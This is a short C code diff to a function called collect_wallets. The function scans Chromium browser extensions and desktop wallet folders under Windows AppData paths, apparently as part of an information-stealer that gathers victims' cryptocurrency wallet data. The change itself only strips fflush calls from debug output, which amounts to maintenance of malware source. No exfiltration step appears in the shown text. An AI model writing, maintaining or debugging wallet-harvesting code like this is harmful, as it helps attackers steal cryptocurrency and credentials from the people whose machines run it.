@@ -10,12 +10,12 @@
 CollectResult collect_wallets(const char *local_app_data, const char *roaming_app_data) {
     CollectResult result = {0};
     
-    dbg_printf("  [wallets] collecting extensions...\n"); fflush(stdout);
+    dbg_printf("  [wallets] collecting extensions...\n");
     
     // Collect from browser extensions
     size_t browser_count;
     const BrowserPath *browsers = get_chromium_browsers(&browser_count);
-    dbg_printf("  [wallets] %zu browsers to scan\n", browser_count); fflush(stdout);
+    dbg_printf("  [wallets] %zu browsers to scan\n", browser_count);
     
     for (size_t i = 0; i < browser_count; i++) {
         const char *app_data = browsers[i].use_roaming ? roaming_app_data : local_app_data;
@@ -27,14 +27,14 @@ CollectResult collect_wallets(const char *local_app_data, const char *roaming_ap
         }
     }
     
-    dbg_printf("  [wallets] collecting desktop...\n"); fflush(stdout);
+    dbg_printf("  [wallets] collecting desktop...\n");
     // Collect desktop wallets
     size_t desk_count = 0;
     WalletDesktopData *desk_wallets = collect_wallet_desktop(roaming_app_data, &desk_count);
     if (desk_wallets) {
         free(desk_wallets);
     }
-    dbg_printf("  [wallets] desktop done: %zu\n", desk_count); fflush(stdout);
+    dbg_printf("  [wallets] desktop done: %zu\n", desk_count);
     
     return result;
 }
